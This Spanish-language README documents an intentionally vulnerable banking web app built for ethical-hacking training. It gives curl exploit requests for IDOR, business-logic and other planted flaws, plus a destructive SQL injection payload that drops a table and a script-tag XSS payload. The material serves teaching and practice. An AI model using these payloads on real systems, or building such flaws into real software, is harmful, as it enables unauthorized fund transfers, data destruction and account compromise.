# Intentional Vulnerabilities - SecLand Central Bank

## Propósito Educativo

Este proyecto contiene **vulnerabilidades intencionales** diseñadas específicamente para fines educativos de hacking ético. Estas vulnerabilidades permiten a los estudiantes practicar técnicas de penetración en un entorno controlado y seguro.

## ⚠️ ADVERTENCIA IMPORTANTE

**ESTE PROYECTO ES ÚNICAMENTE PARA FINES EDUCATIVOS Y DE INVESTIGACIÓN.**
- ❌ **NO** usar en producción
- ❌ **NO** usar con datos reales
- ❌ **NO** usar en entornos corporativos
- ✅ **SÍ** usar para aprendizaje de seguridad
- ✅ **SÍ** usar para investigación académica
- ✅ **SÍ** usar para práctica de pentesting

---

## 🔍 Vulnerabilidades Implementadas

### 1. **A05:2021 - Broken Access Control (IDOR)**

#### **Vulnerabilidad: Creación de Cuentas para Cualquier Usuario**
- **Endpoint:** `POST /api/accounts/create`
- **Descripción:** Permite crear cuentas para cualquier usuario proporcionando su username
- **Explotación:**
```bash
curl -X POST http://localhost:8080/api/accounts/create \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "username": "victim_user",
    "accountType": "Savings",
    "initialDeposit": 1000.00
  }'
```

#### **Vulnerabilidad: Acceso a Cuentas de Otros Usuarios**
- **Endpoint:** `GET /api/accounts/user/{username}`
- **Descripción:** Permite acceder a las cuentas de cualquier usuario
- **Explotación:**
```bash
curl -X GET http://localhost:8080/api/accounts/user/admin \
  -H "Authorization: Bearer YOUR_TOKEN"
```

#### **Vulnerabilidad: Transferencias desde Cualquier Cuenta**
- **Endpoint:** `POST /api/accounts/transfer`
- **Descripción:** Permite transferir fondos desde cualquier cuenta sin verificar propiedad
- **Explotación:**
```bash
curl -X POST http://localhost:8080/api/accounts/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "fromAccountId": 101,
    "toAccountNumber": "SEC1-87654321",
    "amount": 500.00,
    "description": "Unauthorized transfer"
  }'
```

#### **Vulnerabilidad: Depósitos en Cualquier Cuenta**
- **Endpoint:** `POST /api/accounts/{accountId}/deposit`
- **Descripción:** Permite depositar dinero en cualquier cuenta
- **Explotación:**
```bash
curl -X POST http://localhost:8080/api/accounts/101/deposit \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "amount": 1000.00
  }'
```

#### **Vulnerabilidad: Eliminación de Cualquier Cuenta**

- **Endpoint:** `DELETE /api/accounts/{accountId}`
- **Descripción:** Permite eliminar cualquier cuenta sin verificar propiedad
- **Explotación:**
```bash
curl -X DELETE http://localhost:8080/api/accounts/101 \
  -H "Authorization: Bearer YOUR_TOKEN"
```

#### **Vulnerabilidad: Acceso al Historial de Transacciones**

- **Endpoint:** `GET /api/accounts/{accountId}/transactions`
- **Descripción:** Permite ver el historial de transacciones de cualquier cuenta
- **Explotación:**
```bash
curl -X GET http://localhost:8080/api/accounts/101/transactions \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### 2. **A03:2021 - Injection (SQL Injection)**

#### **Vulnerabilidad: Búsqueda de Transacciones**

- **Endpoint:** `GET /api/transactions/search?description={query}`
- **Descripción:** Búsqueda vulnerable a SQL injection
- **Explotación:**
```bash
curl -X GET "http://localhost:8080/api/transactions/search?description='; DROP TABLE transactions; --" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### 3. **A07:2021 - Identification and Authentication Failures**

#### **Vulnerabilidad: Contraseñas Débiles**

- **Descripción:** No hay requisitos de complejidad de contraseñas
- **Explotación:** Usar contraseñas simples como "password123", "123456", etc.

#### **Vulnerabilidad: Sin Rate Limiting**

- **Descripción:** No hay límites en intentos de login
- **Explotación:** Ataques de fuerza bruta sin restricciones

### 4. **A01:2021 - Broken Access Control (Business Logic)**

#### **Vulnerabilidad: Fondos Negativos**

- **Descripción:** Permite transferencias que resultan en saldos negativos
- **Explotación:**
```bash
curl -X POST http://localhost:8080/api/accounts/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "fromAccountId": 101,
    "toAccountNumber": "SEC1-87654321",
    "amount": 999999.00,
    "description": "Overdraft attack"
  }'
```

### 5. **A03:2021 - Cross-Site Scripting (XSS)**

#### **Vulnerabilidad: XSS en Descripciones de Transacciones**

- **Descripción:** Las descripciones de transacciones no se sanitizan
- **Explotación:**
```bash
curl -X POST http://localhost:8080/api/accounts/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "fromAccountId": 101,
    "toAccountNumber": "SEC1-87654321",
    "amount": 10.00,
    "description": "<script>alert(\"XSS\")</script>"
  }'
```

---

## 🛡️ Prácticas Seguras (Para Comparación)

### **Implementaciones Seguras vs Vulnerables**

| Aspecto | Implementación Vulnerable | Implementación Segura |
|---------|---------------------------|----------------------|
| **Validación de Propiedad** | ❌ No verifica propiedad de cuentas | ✅ Verifica que el usuario autenticado sea propietario |
| **Validación de Montos** | ❌ Permite montos ilimitados | ✅ Límites de transacción y validación de saldo |
| **Sanitización de Input** | ❌ No sanitiza entradas | ✅ Sanitiza y valida todas las entradas |
| **Rate Limiting** | ❌ Sin límites de intentos | ✅ Límites de intentos de login |
| **Contraseñas** | ❌ Sin requisitos de complejidad | ✅ Requisitos de complejidad mínima |
| **Logging** | ❌ Logging básico | ✅ Logging de auditoría completo |

---

## 🎯 Escenarios de Práctica

### **Escenario 1: Explotación de IDOR**

1. Registra un usuario normal
2. Obtén un token JWT
3. Intenta acceder a cuentas de otros usuarios
4. Intenta crear cuentas para otros usuarios
5. Intenta transferir fondos desde cuentas ajenas

### **Escenario 2: Ataque de Fuerza Bruta**

1. Identifica usuarios válidos
2. Ejecuta ataques de fuerza bruta sin restricciones
3. Observa la falta de bloqueo de cuentas

### **Escenario 3: Manipulación de Negocio**

1. Crea cuentas con depósitos iniciales grandes
2. Realiza transferencias que resulten en saldos negativos
3. Explota la falta de validación de saldo

### **Escenario 4: Inyección SQL**

1. Identifica endpoints vulnerables
2. Prueba diferentes payloads de SQL injection
3. Intenta extraer información de la base de datos

---

## 🛠️ Herramientas Recomendadas

### **Para Testing Manual:**

- **Burp Suite** - Interceptación y manipulación de requests
- **Postman** - Testing de APIs
- **curl** - Línea de comandos
- **OWASP ZAP** - Escaneo automático

### **Para Testing Automatizado:**

- **SQLMap** - SQL injection testing
- **Hydra** - Ataques de fuerza bruta
- **Custom scripts** - Explotación específica

---

## 📚 Recursos de Aprendizaje

### **OWASP Top 10:**

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### **Cursos Recomendados:**

- **PortSwigger Web Security Academy**
- **OWASP Juice Shop**
- **DVWA (Damn Vulnerable Web Application)**

### **Certificaciones:**

- **OSCP (Offensive Security Certified Professional)**
- **CEH (Certified Ethical Hacker)**
- **eJPT (eLearnSecurity Junior Penetration Tester)**

---

## ⚖️ Consideraciones Éticas

### **Uso Responsable:**

- ✅ Solo usar en entornos controlados
- ✅ Solo usar con datos de prueba
- ✅ Documentar hallazgos para aprendizaje
- ✅ Reportar vulnerabilidades de manera responsable

### **Lo que NO hacer:**

- ❌ Usar en sistemas de producción
- ❌ Usar con datos reales de usuarios
- ❌ Usar para actividades maliciosas
- ❌ Compartir exploits sin contexto educativo

---

## 🔧 Configuración para Testing

### **Entorno de Desarrollo:**
```bash
# Clonar el repositorio
git clone https://github.com/careb36/BancoCentral-SecLand-Vulnerable.git
cd BancoCentral-SecLand-Vulnerable

# Levantar con Docker
docker-compose up --build

# Acceder a la aplicación
# Frontend: http://localhost
# API: http://localhost:8080
```

### **Datos de Prueba:**
```sql
-- Usuarios de prueba
INSERT INTO users (username, password, full_name) VALUES
('admin', '$2a$10$...', 'Administrator'),
('user1', '$2a$10$...', 'Regular User'),
('user2', '$2a$10$...', 'Another User');

-- Cuentas de prueba
INSERT INTO accounts (account_number, account_type, balance, user_id) VALUES
('SEC1-12345678', 'Savings', 5000.00, 1),
('SEC1-87654321', 'Checking', 2500.00, 2),
('SEC1-11111111', 'Savings', 1000.00, 3);
```

---

## 📝 Reporte de Hallazgos

### **Plantilla de Reporte:**
```
## Vulnerabilidad Encontrada

### Descripción
[Descripción detallada de la vulnerabilidad]

### Severidad
[Alta/Media/Baja]

### Pasos para Reproducir
1. [Paso 1]
2. [Paso 2]
3. [Paso 3]

### Impacto
[Descripción del impacto potencial]

### Recomendaciones
[Recomendaciones para mitigar la vulnerabilidad]

### Evidencia
[Capturas de pantalla, logs, etc.]
```

---

**Recuerda: Este proyecto es para EDUCACIÓN. Úsalo responsablemente y aprende de las vulnerabilidades para construir aplicaciones más seguras.** 
